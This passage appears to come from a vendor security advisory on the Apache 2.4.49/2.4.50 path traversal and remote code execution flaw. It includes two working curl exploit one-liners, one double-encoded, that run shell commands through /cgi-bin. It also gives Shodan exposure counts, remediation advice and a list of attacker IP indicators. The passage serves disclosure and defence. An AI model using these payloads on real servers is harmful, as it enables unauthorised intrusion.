
sh.
Below is the vulnerable configuration of httpd.conf: mod_cgi module enabled in httpd.conf We can check the response with a one-liner curl command: curl ‘http://<Target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh’ -d ‘A=|echo;id
’ -vv
Testing remote code execution curl ‘http://<Target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh’ –data ‘echo Content-Type: text/plain; echo; id’
Testing remote code execution with double encoding By conducting a simple search on Shodan, results show s that there are over 112,000 Apache servers across the globe running on Apache http server version 2.4.49 and almost 13,000 with version 2.4.50.
There might be other vulnerable web servers configured that do not display version information.
Shodan results for Apache Http Server 2.4.49 Image Source: Shodan Shodan results for Apache Http Server 2.4.50 Image Source: Shodan Remediation and Conclusion: Juniper Networks’ SRX Series Next-Generation Firewall (NGFW) customers with an IDP license are protected against this vulnerability by the signature: HTTP: APACHE: APACHE-PATH-TRAV.
At the same time, all customers are recommended to update to the latest stable version of Apache http server as soon as possible, as per the advisory released by the Apache Foundation and to mitigate any risk associated with active exploitation of the flaw.
Indicators of Compromise: Below are some of the attacker’s IOC’s: 45[.]146.164.110 139[.]59.126.50 128[.]90.166.247 128[.]90.161.152 128[.]90.166.31 157[.]119.200.185 163[.]172.173.238 89[.]248.173.143 145[.]220.25.28 134[.]122.112.12 145[.]220.25.6 161[.]35.86.181 143[.]198.136.88 155[.]138.142.87 167[.]99.133.28 185[.]111.51.118 185[.]225.17.102 89[.]46.62.130 137[.]184.69.137 140[.]213.59.194 142[.]93.35.77 143[.]198.62.76 157[.]230.212.97 157[.]230.216.201 157[.]245.153.240 157[.]245.51.232 178[.]128.164.5 46[.]101.59.235

